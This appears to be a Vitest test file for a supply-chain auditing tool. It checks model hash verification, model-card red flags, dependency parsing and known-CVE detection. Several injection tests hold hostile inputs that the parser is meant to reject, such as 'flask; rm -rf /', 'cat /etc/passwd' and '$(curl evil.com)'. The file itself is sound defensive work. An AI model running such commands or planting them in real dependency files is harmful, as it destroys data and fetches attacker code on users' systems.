/**
 * H24: Supply Chain Integration Tests
 * Tests for model verification and dependency auditing.
 */

// @vitest-environment node

import { describe, it, expect } from 'vitest';
import { createHash } from 'node:crypto';
import { verifyModelHash, analyzeModelCard } from './verifier.js';
import {
  parseRequirementsTxt,
  parsePackageJson,
  parsePyprojectToml,
  checkVulnerabilities,
  auditDependencyFile,
} from './dependency-auditor.js';

// ===== H24.1: Model Verification =====

describe('H24.1: Model Hash Verification', () => {
  it('SC-001: verifies correct SHA-256 hash', async () => {
    const data = Buffer.from('test model data');
    const expectedHash = createHash('sha256').update(data).digest('hex');

    const result = await verifyModelHash(data, expectedHash);

    expect(result.verified).toBe(true);
    expect(result.sha256).toBe(expectedHash);
    expect(result.expectedHash).toBe(expectedHash);
  });

  it('SC-002: rejects incorrect SHA-256 hash', async () => {
    const data = Buffer.from('test model data');
    const wrongHash = 'a'.repeat(64);

    const result = await verifyModelHash(data, wrongHash);

    expect(result.verified).toBe(false);
    expect(result.sha256).not.toBe(wrongHash);
  });

  it('SC-003: normalizes expected hash to lowercase', async () => {
    const data = Buffer.from('normalize test');
    const expectedHash = createHash('sha256').update(data).digest('hex');

    const result = await verifyModelHash(data, expectedHash.toUpperCase());

    expect(result.verified).toBe(true);
  });
});

describe('H24.1: Model Card Analysis', () => {
  const completeModelCard = `# Model Name

## License
MIT License

## Training Data
Trained on CommonCrawl subset, filtered for quality.

## Intended Use
Text classification for sentiment analysis.

## Limitations
Not suitable for production medical diagnosis.
`;

  it('SC-004: detects complete model card with no red flags', () => {
    const result = analyzeModelCard(completeModelCard);

    expect(result.hasModelCard).toBe(true);
    expect(result.redFlags).toHaveLength(0);
    expect(result.license).toBe('MIT License');
    expect(result.trainingData).toContain('CommonCrawl');
    expect(result.intendedUse).toContain('sentiment analysis');
    expect(result.limitations).toContain('medical diagnosis');
  });

  it('SC-005: flags missing license', () => {
    const result = analyzeModelCard('# Model\n\nJust a model.');
    expect(result.redFlags).toContain('Missing license information');
  });

  it('SC-006: flags missing training data disclosure', () => {
    const result = analyzeModelCard('# Model\n\n## License\nMIT');
    expect(result.redFlags).toContain('No training data disclosure');
  });

  it('SC-007: flags missing intended use', () => {
    const result = analyzeModelCard('# Model\n\n## License\nMIT');
    expect(result.redFlags).toContain('No intended use statement');
  });

  it('SC-008: flags missing limitations section', () => {
    const result = analyzeModelCard('# Model\n\n## License\nMIT');
    expect(result.redFlags).toContain('Missing limitations section');
  });

  it('SC-009: flags "uncensored" mention', () => {
    const card = `# Model

## License
MIT

## Training Data
Trained on data.

## Intended Use
General use.

## Limitations
None known.

This is an uncensored model.
`;
    const result = analyzeModelCard(card);
    expect(result.redFlags).toContain('Model mentions "uncensored" or "no safety"');
  });

  it('SC-010: flags "no safety" mention', () => {
    const card = `# Model

## License
MIT

## Training Data
Trained on data.

## Intended Use
General use.

## Limitations
None known.

This model has no safety filters.
`;
    const result = analyzeModelCard(card);
    expect(result.redFlags).toContain('Model mentions "uncensored" or "no safety"');
  });

  it('SC-011: detects all red flags on empty content', () => {
    const result = analyzeModelCard('');
    expect(result.hasModelCard).toBe(false);
    expect(result.redFlags.length).toBeGreaterThanOrEqual(4);
  });
});

// ===== H24.2: Dependency Auditing =====

describe('H24.2: requirements.txt Parser', () => {
  it('SC-012: parses name==version format', () => {
    const content = 'flask==2.3.2\nrequests==2.31.0';
    const deps = parseRequirementsTxt(content);

    expect(deps).toHaveLength(2);
    expect(deps[0].name).toBe('flask');
    expect(deps[0].version).toBe('2.3.2');
    expect(deps[0].specifier).toBe('==');
    expect(deps[0].source).toBe('requirements.txt');
  });

  it('SC-013: parses name>=version format', () => {
    const content = 'numpy>=1.21.0';
    const deps = parseRequirementsTxt(content);

    expect(deps).toHaveLength(1);
    expect(deps[0].name).toBe('numpy');
    expect(deps[0].version).toBe('1.21.0');
    expect(deps[0].specifier).toBe('>=');
  });

  it('SC-014: parses name~=version format', () => {
    const content = 'django~=4.2';
    const deps = parseRequirementsTxt(content);

    expect(deps).toHaveLength(1);
    expect(deps[0].specifier).toBe('~=');
  });

  it('SC-015: handles extras syntax', () => {
    const content = 'requests[security]==2.31.0';
    const deps = parseRequirementsTxt(content);

    expect(deps).toHaveLength(1);
    expect(deps[0].name).toBe('requests');
    expect(deps[0].version).toBe('2.31.0');
  });

  it('SC-016: ignores comments and empty lines', () => {
    const content = '# This is a comment\n\nflask==2.3.2\n\n# Another comment\n';
    const deps = parseRequirementsTxt(content);

    expect(deps).toHaveLength(1);
    expect(deps[0].name).toBe('flask');
  });

  it('SC-017: parses name-only dependencies', () => {
    const content = 'pytest\nblack';
    const deps = parseRequirementsTxt(content);

    expect(deps).toHaveLength(2);
    expect(deps[0].version).toBeNull();
    expect(deps[0].specifier).toBeNull();
  });

  it('SC-018: SEC-08 rejects command injection in package names', () => {
    expect(() => parseRequirementsTxt('flask; rm -rf /')).toThrow('SEC-08');
    expect(() => parseRequirementsTxt('flask | cat /etc/passwd')).toThrow('SEC-08');
    expect(() => parseRequirementsTxt('$(curl evil.com)')).toThrow('SEC-08');
    expect(() => parseRequirementsTxt('`curl evil.com`')).toThrow('SEC-08');
  });

  it('SC-019: SEC-08 rejects URL-based requirements', () => {
    expect(() =>
      parseRequirementsTxt('https://evil.com/package.tar.gz'),
    ).toThrow('SEC-08');
    expect(() =>
      parseRequirementsTxt('git+https://github.com/user/repo.git'),
    ).toThrow('SEC-08');
  });
});

describe('H24.2: package.json Parser', () => {
  it('SC-020: parses dependencies and devDependencies', () => {
    const content = JSON.stringify({
      dependencies: {
        lodash: '^4.17.21',
        express: '~4.18.0',
      },
      devDependencies: {
        vitest: '^1.0.0',
      },
    });

    const deps = parsePackageJson(content);

    expect(deps).toHaveLength(3);
    expect(deps[0].name).toBe('lodash');
    expect(deps[0].version).toBe('4.17.21');
    expect(deps[0].specifier).toBe('^');
    expect(deps[0].source).toBe('package.json');
  });

  it('SC-021: handles scoped packages', () => {
    const content = JSON.stringify({
      dependencies: {
        '@types/node': '^20.0.0',
        '@scope/package': '1.0.0',
      },
    });

    const deps = parsePackageJson(content);

    expect(deps).toHaveLength(2);
    expect(deps[0].name).toBe('@types/node');
  });

  it('SC-022: SEC-08 rejects injection in npm package names', () => {
    const content = JSON.stringify({
      dependencies: { 'pkg; rm -rf /': '1.0.0' },
    });
    expect(() => parsePackageJson(content)).toThrow('SEC-08');
  });

  it('SC-023: rejects invalid npm names (unscoped slash)', () => {
    const content = JSON.stringify({
      dependencies: { 'invalid/name': '1.0.0' },
    });
    expect(() => parsePackageJson(content)).toThrow('SEC-08');
  });

  it('SC-024: handles empty dependencies gracefully', () => {
    const content = JSON.stringify({ name: 'test', version: '1.0.0' });
    const deps = parsePackageJson(content);
    expect(deps).toHaveLength(0);
  });
});

describe('H24.2: pyproject.toml Parser', () => {
  it('SC-025: parses [project.dependencies] array', () => {
    const content = `
[project]
name = "my-package"
dependencies = [
  "flask>=2.3.0",
  "requests==2.31.0",
  "numpy",
]
`;
    const deps = parsePyprojectToml(content);

    expect(deps).toHaveLength(3);
    expect(deps[0].name).toBe('flask');
    expect(deps[0].version).toBe('2.3.0');
    expect(deps[0].specifier).toBe('>=');
    expect(deps[1].name).toBe('requests');
    expect(deps[2].name).toBe('numpy');
    expect(deps[2].version).toBeNull();
  });

  it('SC-026: SEC-08 rejects injection in pyproject.toml', () => {
    const content = `
[project]
dependencies = [
  "flask; rm -rf /",
]
`;
    expect(() => parsePyprojectToml(content)).toThrow('SEC-08');
  });

  it('SC-027: returns empty for missing dependencies section', () => {
    const content = `
[project]
name = "my-package"
version = "1.0.0"
`;
    const deps = parsePyprojectToml(content);
    expect(deps).toHaveLength(0);
  });
});

describe('H24.2: Vulnerability Detection', () => {
  it('SC-028: flags lodash < 4.17.21', () => {
    const deps = [
      { name: 'lodash', version: '4.17.20', specifier: '==', source: 'package.json' },
    ];
    const vulns = checkVulnerabilities(deps);

    expect(vulns).toHaveLength(1);
    expect(vulns[0].cveId).toBe('CVE-2021-23337');
    expect(vulns[0].severity).toBe('high');
    expect(vulns[0].fixVersion).toBe('4.17.21');
  });

  it('SC-029: does not flag lodash >= 4.17.21', () => {
    const deps = [
      { name: 'lodash', version: '4.17.21', specifier: '==', source: 'package.json' },
    ];
    const vulns = checkVulnerabilities(deps);
    expect(vulns).toHaveLength(0);
  });

  it('SC-030: flags minimist < 1.2.6', () => {
    const deps = [
      { name: 'minimist', version: '1.2.5', specifier: '==', source: 'package.json' },
    ];
    const vulns = checkVulnerabilities(deps);

    expect(vulns).toHaveLength(1);
    expect(vulns[0].cveId).toBe('CVE-2021-44906');
    expect(vulns[0].severity).toBe('critical');
  });

  it('SC-031: flags requests < 2.31.0', () => {
    const deps = [
      { name: 'requests', version: '2.28.0', specifier: '==', source: 'requirements.txt' },
    ];
    const vulns = checkVulnerabilities(deps);

    expect(vulns).toHaveLength(1);
    expect(vulns[0].cveId).toBe('CVE-2023-32681');
  });

  it('SC-032: clean dependencies pass without vulnerabilities', () => {
    const deps = [
      { name: 'lodash', version: '4.17.21', specifier: '^', source: 'package.json' },
      { name: 'express', version: '4.18.2', specifier: '^', source: 'package.json' },
      { name: 'requests', version: '2.31.0', specifier: '==', source: 'requirements.txt' },
    ];
    const vulns = checkVulnerabilities(deps);
    expect(vulns).toHaveLength(0);
  });

  it('SC-033: skips dependencies without version', () => {
    const deps = [
      { name: 'lodash', version: null, specifier: null, source: 'requirements.txt' },
    ];
    const vulns = checkVulnerabilities(deps);
    expect(vulns).toHaveLength(0);
  });
});

describe('H24.2: auditDependencyFile', () => {
  it('SC-034: audits requirements.txt end-to-end', () => {
    const content = 'flask==2.3.0\nrequests==2.28.0\nnumpy==1.24.0';
    const result = auditDependencyFile(content, 'requirements.txt');

    expect(result.format).toBe('requirements.txt');
    expect(result.dependencies).toHaveLength(3);
    // flask 2.3.0 < 2.3.2 → vulnerable; requests 2.28.0 < 2.31.0 → vulnerable
    expect(result.vulnerabilities.length).toBeGreaterThanOrEqual(2);
  });

  it('SC-035: audits package.json end-to-end', () => {
    const content = JSON.stringify({
      dependencies: {
        lodash: '^4.17.20',
        express: '^4.18.2',
      },
    });
    const result = auditDependencyFile(content, 'package.json');

    expect(result.format).toBe('package.json');
    expect(result.dependencies).toHaveLength(2);
    expect(result.vulnerabilities).toHaveLength(1);
    expect(result.vulnerabilities[0].dependencyName).toBe('lodash');
  });

  it('SC-036: audits pyproject.toml end-to-end', () => {
    const content = `
[project]
dependencies = [
  "flask==2.3.2",
  "requests==2.31.0",
]
`;
    const result = auditDependencyFile(content, 'pyproject.toml');

    expect(result.format).toBe('pyproject.toml');
    expect(result.dependencies).toHaveLength(2);
    expect(result.vulnerabilities).toHaveLength(0);
  });
});
